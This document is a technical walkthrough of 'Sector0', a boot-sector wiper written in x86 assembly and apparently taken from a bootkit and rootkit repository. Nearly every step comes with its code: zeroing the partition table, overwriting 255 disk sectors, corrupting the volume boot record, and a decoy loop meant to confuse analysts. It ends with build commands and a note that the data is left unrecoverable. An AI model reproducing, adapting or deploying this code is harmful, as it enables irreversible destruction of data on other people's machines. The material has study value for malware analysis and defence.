# Sector0 Bootloader - Technical Breakdown

A 512-byte MBR wiper payload written in 16-bit x86 Real Mode assembly.

---

## Table of Contents

1. [How BIOS Boot Works](#how-bios-boot-works)
2. [Phase 1: CPU Setup](#phase-1-cpu-setup)
3. [Phase 2: Print Message](#phase-2-print-message)
4. [Phase 3: Wipe Payload](#phase-3-wipe-payload)
   - [Corrupt Partition Table](#step-a-corrupt-partition-table)
   - [Wipe 255 Sectors](#step-b-wipe-255-sectors)
   - [Corrupt VBR](#step-c-corrupt-vbr)
5. [Helper Functions](#helper-functions)
6. [Boot Signature](#boot-signature)
7. [Memory Layout](#memory-layout)
8. [End Result](#end-result)

---

## How BIOS Boot Works

When a PC boots in Legacy BIOS mode:

1. BIOS reads the **first 512 bytes** (sector 0) of the hard disk
2. Checks for magic signature `0xAA55` at bytes 510-511
3. Loads it to memory address `0x7C00`
4. Jumps to `0x7C00` and starts executing

Our payload occupies that first sector after installation.

---

## Phase 1: CPU Setup

```asm
_start:
    mov ax, 0x07C0
    mov ds, ax      ; Data Segment = 0x07C0
    mov es, ax      ; Extra Segment
    mov ss, ax      ; Stack Segment  
    mov sp, 0x7C00  ; Stack Pointer
```

**Purpose**: Initialize CPU segment registers so we can:

| Register | Purpose |
|----------|---------|
| `DS` | Access our data (strings, patterns) |
| `ES` | Extra segment for string operations |
| `SS:SP` | Stack for `push`/`pop`/`call`/`ret` |

> **Note**: Segments are "base addresses" - when we access `[SI]`, CPU reads from `DS:SI` = `0x07C0:SI`.

---

## Phase 2: Print Message

```asm
    mov si, msg_goodbye     ; SI points to our string
    call print_string       ; Call the print function
```

Uses BIOS interrupt `INT 0x10, AH=0x0E` (teletype mode) to display:

```
SECTOR0: Disk wipe complete.
```

The `print_string` function loops through each character until it hits `0x00` (null terminator).

---

## Phase 3: Wipe Payload

```asm
    call wipe_payload
    jmp $                   ; Infinite loop (halt)
```

### Fake Decryption (Obfuscation)

```asm
wipe_payload:
    mov si, xor_key
    mov cx, 5
.decrypt:
    lodsb                   ; Load byte, increment SI
    loop .decrypt           ; Repeat 5 times
```

This does nothing useful - it's just to confuse reverse engineers.

---

### Step A: Corrupt Partition Table

```asm
    call read_mbr           ; Read current MBR into buffer at 0x7C00
    
    mov di, 0x7C00 + 0x1BE  ; Partition table starts at offset 0x1BE (446)
    mov cx, 4 * 16          ; 4 partitions × 16 bytes = 64 bytes
    mov al, 0x00
.corrupt_pt:
    stosb                   ; Store AL at [DI], increment DI
    loop .corrupt_pt        ; Zero out entire partition table
    
    call write_mbr          ; Write corrupted MBR back to disk
```

**MBR Structure**:

| Offset | Size | Content |
|--------|------|---------|
| 0x000 | 446 bytes | Boot code (our payload) |
| 0x1BE | 64 bytes | Partition table (4 × 16 bytes) |
| 0x1FE | 2 bytes | Boot signature (`0xAA55`) |

**Effect**: We zero out bytes 446-509, destroying all partition entries. Windows can no longer find any partitions.

---

### Step B: Wipe 255 Sectors

```asm
    mov cx, 255
.wipe_sectors:
    push cx                 ; Save counter
    
    call fill_wipe_pattern  ; Fill buffer with "SECTOR0!!"
    
    ; BIOS INT 0x13, AH=0x03 = Write Sector
    mov ah, 0x03            ; Write function
    mov al, 0x01            ; 1 sector (512 bytes)
    mov ch, 0x00            ; Cylinder 0
    mov cl, [sector_num]    ; Sector number (1-255)
    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; Drive 0x80 = first hard disk
    int 0x13                ; Execute!
    
    pop cx
    inc cl                  ; Next sector
    loop .wipe_sectors
```

**Effect**: 
- Loops 255 times
- Each iteration overwrites one 512-byte sector with `"SECTOR0!!SECTOR0!!SECTOR0!!..."`
- **Destroys**: MBR, VBR, Windows Boot Manager, NTFS $MFT, etc.

---

### Step C: Corrupt VBR

```asm
    call read_vbr           ; Read sector 2 (Volume Boot Record)
    call corrupt_vbr        ; Corrupt the OEM name field
    call write_vbr          ; Write it back
```

The VBR contains a **BPB (BIOS Parameter Block)** with an 8-byte OEM name at offset 0x03 (e.g., `"NTFS    "`):

```asm
corrupt_vbr:
    mov di, 0x7C00 + 0x03   ; OEM name at offset 3
    mov al, 0x00
    stosb                   ; [DI++] = 0
    stosb
    stosb
    stosb
    stosb                   ; Zeros first 5 bytes of OEM name
```

**Effect**: Filesystem becomes unrecognizable.

---

## Helper Functions

| Function | BIOS Interrupt | Description |
|----------|----------------|-------------|
| `print_string` | `INT 0x10, AH=0x0E` | Print null-terminated string |
| `read_mbr` | `INT 0x13, AH=0x02` | Read sector 1 → buffer |
| `write_mbr` | `INT 0x13, AH=0x03` | Write buffer → sector 1 |
| `read_vbr` | `INT 0x13, AH=0x02` | Read sector 2 → buffer |
| `write_vbr` | `INT 0x13, AH=0x03` | Write buffer → sector 2 |
| `fill_wipe_pattern` | — | Fill 512 bytes with "SECTOR0!!" |

### BIOS INT 0x13 Parameters

```
AH = 0x02 (Read) or 0x03 (Write)
AL = Number of sectors
CH = Cylinder (low 8 bits)
CL = Sector number (1-based)
DH = Head number
DL = Drive number (0x80 = first HDD)
ES:BX = Buffer address
```

---

## Boot Signature

```asm
times 510-($-$$) db 0       ; Pad with zeros to byte 510
dw 0xAA55                   ; Magic signature at bytes 510-511
```

- `times 510-($-$$) db 0` = Fill remaining space with zeros until offset 510
- `0xAA55` = Magic number BIOS checks to confirm valid boot sector

> **Without this signature, BIOS won't execute our code!**

---

## Memory Layout

### MBR Structure (Sector 0)

```
┌────────────────────────────────────┐ Offset 0x000
│                                    │
│    Boot Code (our payload)         │
│         446 bytes                  │
│                                    │
├────────────────────────────────────┤ Offset 0x1BE
│ Partition Entry 1       16 bytes   │ ← ZEROED
├────────────────────────────────────┤
│ Partition Entry 2       16 bytes   │ ← ZEROED
├────────────────────────────────────┤
│ Partition Entry 3       16 bytes   │ ← ZEROED
├────────────────────────────────────┤
│ Partition Entry 4       16 bytes   │ ← ZEROED
├────────────────────────────────────┤ Offset 0x1FE
│ 0x55 0xAA               2 bytes    │ ← Boot signature
└────────────────────────────────────┘ Offset 0x200 (512)
```

### Partition Entry Format (16 bytes each)

| Offset | Size | Description |
|--------|------|-------------|
| 0x00 | 1 | Boot indicator (0x80 = active) |
| 0x01 | 3 | Starting CHS address |
| 0x04 | 1 | Partition type |
| 0x05 | 3 | Ending CHS address |
| 0x08 | 4 | Starting LBA |
| 0x0C | 4 | Number of sectors |

---

## End Result

After execution:

| Component | Status | Effect |
|-----------|--------|--------|
| Partition Table | ❌ Destroyed | Windows can't find C: drive |
| Sectors 1-255 | ❌ Overwritten | Boot files, NTFS metadata corrupted |
| VBR | ❌ Corrupted | Filesystem unreadable |

**User Experience**: 
- System boots to "Operating system not found"
- Or enters Windows Recovery
- Data is **unrecoverable** without forensic tools

---

## Building

```bash
# Assemble with NASM
nasm -f bin bootloader.asm -o bootloader.bin

# Verify size (must be exactly 512 bytes)
ls -la bootloader.bin
```

---

## References

- [OSDev Wiki - MBR](https://wiki.osdev.org/MBR)
- [OSDev Wiki - Partition Table](https://wiki.osdev.org/Partition_Table)
- [BIOS INT 0x13 - Disk Services](https://en.wikipedia.org/wiki/INT_13H)
- [Original Source](https://github.com/liuzhaicutey/Windows_DLLs_Bootkits_Rootkits)

---

*Author: saladin0x1*
